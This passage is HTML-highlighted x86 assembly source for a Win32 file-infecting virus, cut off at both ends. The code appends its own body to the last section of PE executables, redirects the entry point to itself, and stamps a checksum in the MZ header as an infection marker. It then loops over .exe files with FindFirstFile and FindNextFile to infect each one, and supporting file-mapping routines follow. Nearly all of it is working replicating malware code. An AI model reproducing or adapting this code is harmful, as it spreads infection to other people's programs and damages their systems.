    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virtual_End</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start_Virus</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;new virtual size of section</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;new SizeOfRawData (aligned virtual size)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrigEPoint</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrigEPoint</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader.OH_SizeOfImage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;new SizeOfImage</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_Characteristics.hiw.hib</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0e0h</span><span class="sc0">  </span><span class="sc1">;change flags</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Start_Virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Virtual_End</span><span class="sc0"> 
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Start_Virus</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_End</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start_Virus</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">                       </span><span class="sc1">;copy virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrigEPoint</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;restore variable after copy stage</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CloseFileOK</span><span class="sc0">

</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFile</span><span class="sc0">            </span><span class="sc1">;unmap view of file</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_SetFileAttributez</span><span class="sc0">       </span><span class="sc1">;and restore attributes</span><span class="sc0">
    
</span><span class="sc5">CloseFileOK</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MZ_res2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Checksum64</span><span class="sc0">     </span><span class="sc1">;generate new 64bit checksum as "already infected" mark</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">;store it to MZ.MZ_res2 field</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Win32_Find_Data.WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">;correct file size for unmapping</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFile</span><span class="sc0">        </span><span class="sc1">;unmap view of file</span><span class="sc0">

</span><span class="sc5">end_SetFileAttributez</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Win32_Find_Data</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;restore attributes</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MySetFileAttributesA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">end_size_check</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindNextFile</span><span class="sc0">               </span><span class="sc1">;find next file</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">next_file</span><span class="sc0">                   </span><span class="sc1">;weve got one, check that</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindClose</span><span class="sc0">                  </span><span class="sc1">;nope, close search handle</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc0">                    </span><span class="sc1">;and jump to host</span><span class="sc0">

</span><span class="sc5">next_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckFileName</span><span class="sc0">              </span><span class="sc1">;check file name</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">Infect_File</span><span class="sc0">                 </span><span class="sc1">;ok, infect it</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_size_check</span><span class="sc0">              </span><span class="sc1">;nope, try next file</span><span class="sc0">


</span><span class="sc5">CheckFileName</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                  </span><span class="sc1">;check file name</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Win32_Find_Data.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vszNamez</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vszNumberOfNamez</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">Ext_Next_Char</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@endsz</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">Ext_Next_Char2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Ext_Matched_Char</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Ext_Next_Char</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Ext_Matched_Char</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Ext_Next_Char2</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc5">end_Ext_Checking</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckFileName</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">


</span><span class="sc5">FindFirstFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                  </span><span class="sc1">;find first file procedure</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Win32_Find_Data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vszExe</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyFindFirstFileA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SearchHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FindFirstFile</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc5">FindNextFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                   </span><span class="sc1">;find next file procedure</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Win32_Find_Data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SearchHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyFindNextFileA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FindNextFile</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc5">FindClose</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                      </span><span class="sc1">;find close procedure</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SearchHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyFindClose</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">



</span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                   </span><span class="sc1">;open and map file procedure</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;NULL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">      </span><span class="sc1">;OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;NULL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">;FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0c0000000h</span><span class="sc0"> </span><span class="sc1">;GENERIC_READ | GENERIC_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">    </span><span class="sc1">;pszFileName</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyCreateFileA</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;open</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">;NULL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">;file size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">;0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">      </span><span class="sc1">;PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">;NULL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;handle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyCreateFileMappingA</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;create mapping object</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hMapFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">;0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">;0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">;0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">;FILE_MAP_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">;handle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyMapViewOfFile</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;map file to address space of app</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">


</span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                    </span><span class="sc1">;close and unmap file procedure</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyUnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;unmap file</span><span class="sc0">

</span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hMapFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyCloseHandle</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;close mapping object</span><span class="sc0">

</span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile2</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">cdq</span><span class="sc0">     </span><span class="sc1">;xor edx, edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">;FILE_BEGIN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">;0   - high offset</span><span class="sc0">
